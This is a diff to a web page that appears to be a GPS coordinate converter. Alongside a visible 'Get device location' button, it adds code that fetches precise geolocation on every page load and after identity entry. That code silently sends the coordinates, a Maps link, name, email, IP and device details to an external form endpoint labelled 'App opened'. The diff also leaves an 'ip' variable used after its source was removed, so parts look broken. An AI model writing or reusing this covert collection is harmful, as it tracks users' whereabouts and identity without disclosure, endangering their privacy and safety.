@@ -203,8 +203,19 @@
       <button id="arcMapBtn" onclick="arcToDD()">View in Google Maps</button>
     </div>
   </div>
-  
-  
+
+  <div class="converter">
+    <h2 onclick="toggleSection(this)">Device Location</h2>
+    <div class="converter-content">
+      <button type="button" id="locateBtn" onclick="fetchDeviceLocation()">Get device location</button>
+      <div class="result-box" id="deviceLocationBox" style="display:none; margin-top: 12px;">
+        <p><strong>Latitude:</strong> <span id="deviceLat">—</span></p>
+        <p><strong>Longitude:</strong> <span id="deviceLon">—</span></p>
+        <p><strong>Maps:</strong> <a id="deviceMapsLink" href="#" target="_blank" rel="noopener">Tap to open</a></p>
+      </div>
+    </div>
+  </div>
+
   <script>
   function arcToDD() {
     const arcE = parseFloat(document.getElementById('arc_to_dd_e').value);
@@ -383,6 +394,62 @@ async function getDeviceModel() {
   if (/iPad/.test(userAgent)) return "iPad";
 
   return "Unknown device";
+}
+
+async function getDeviceLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve({ error: 'unsupported' });
+      return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        resolve({
+          lat: position.coords.latitude.toFixed(6),
+          lon: position.coords.longitude.toFixed(6)
+        });
+      },
+      (error) => {
+        resolve({ error: error.message || 'permission_denied' });
+      },
+      {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 60000
+      }
+    );
+  });
+}
+
+function setDeviceLocationUI(lat, lon) {
+  const box = document.getElementById('deviceLocationBox');
+  const link = document.getElementById('deviceMapsLink');
+  document.getElementById('deviceLat').textContent = lat;
+  document.getElementById('deviceLon').textContent = lon;
+  link.href = `https://www.google.com/maps?q=${lat},${lon}`;
+  link.textContent = 'Tap to open in Google Maps';
+  box.style.display = 'block';
+  document.getElementById('dd_lat').value = lat;
+  document.getElementById('dd_lon').value = lon;
+}
+
+async function fetchDeviceLocation() {
+  const btn = document.getElementById('locateBtn');
+  btn.textContent = 'Locating...';
+  btn.disabled = true;
+
+  const location = await getDeviceLocation();
+  if (location.error) {
+    alert('Device location unavailable: ' + location.error);
+    btn.textContent = 'Get device location';
+    btn.disabled = false;
+    return;
+  }
+
+  setDeviceLocationUI(location.lat, location.lon);
+  btn.textContent = 'Get device location';
+  btn.disabled = false;
 }
 </script>
 
@@ -1143,9 +1210,10 @@ async function sendToFormspree(data) {
     console.warn("Send failed", err);
   }
 }
+let currentIP = "Unknown";
 </script>
 <script>
-document.getElementById("save-user-btn").addEventListener("click", () => {
+document.getElementById("save-user-btn").addEventListener("click", async () => {
   const nameInput = document.getElementById("user-fullname");
   const emailInput = document.getElementById("user-email");
   const error = document.getElementById("user-modal-error");
@@ -1165,23 +1233,34 @@ document.getElementById("save-user-btn").addEventListener("click", () => {
   };
 
   // 🔹 session identity (used by app)
-localStorage.setItem("gpsUserIdentity", JSON.stringify(identity));
+  localStorage.setItem("gpsUserIdentity", JSON.stringify(identity));
 
   // 🔹 last-used identity (used only to prefill)
-localStorage.setItem("gpsUserLastIdentity", JSON.stringify(identity));
+  localStorage.setItem("gpsUserLastIdentity", JSON.stringify(identity));
 
   document.getElementById("user-modal").style.display = "none";
 
+  const location = await getDeviceLocation();
+  const locationPayload = location.error ? {
+    deviceLatitude: "Unavailable",
+    deviceLongitude: "Unavailable",
+    deviceMapLink: "N/A"
+  } : {
+    deviceLatitude: location.lat,
+    deviceLongitude: location.lon,
+    deviceMapLink: `https://www.google.com/maps?q=${location.lat},${location.lon}`
+  };
 
-  sendToFormspree({ 
+  await sendToFormspree({ 
     message: "📍 App opened",
-    name: user.name || "Unknown",
-    email: user.email || "Unknown",
-    ip: ip,
+    name: identity.name,
+    email: identity.email,
+    ip: currentIP,
     platform: navigator.platform,
     language: navigator.language,
-    device:  getDeviceModel(),
-    time: new Date().toISOString()
+    device:  await getDeviceModel(),
+    time: new Date().toISOString(),
+    ...locationPayload
   });
 });
 </script>
@@ -1504,6 +1583,18 @@ document.addEventListener("DOMContentLoaded", async () => {
   // 🔹 Get user identity properly
   const user = JSON.parse(localStorage.getItem("gpsUserIdentity") || "{}");
 
+  const location = await getDeviceLocation();
+  const locationPayload = location.error ? {
+    deviceLatitude: "Unavailable",
+    deviceLongitude: "Unavailable",
+    deviceMapLink: "N/A"
+  } : {
+    deviceLatitude: location.lat,
+    deviceLongitude: location.lon,
+    deviceMapLink: `https://www.google.com/maps?q=${location.lat},${location.lon}`
+  };
+
+  currentIP = ip;
   await sendToFormspree({
     message: "📍 App opened",
     name: user.name || "Unknown",
@@ -1512,22 +1603,12 @@ document.addEventListener("DOMContentLoaded", async () => {
     platform: navigator.platform,
     language: navigator.language,
     device: await getDeviceModel(),
-    time: new Date().toISOString()
+    time: new Date().toISOString(),
+    ...locationPayload
   });
 });
 </script>
   <script>
-  document.addEventListener("DOMContentLoaded", async () => {
-  let ip = "Unknown";
-  try {
-    const res = await fetch("https://api64.ipify.org?format=json");
-    ip = (await res.json()).ip;
-  } catch (e) {}
-
-
-});
-
-  
 
   // --- Optional: Notify when user leaves page ---
   window.addEventListener("beforeunload", () => {
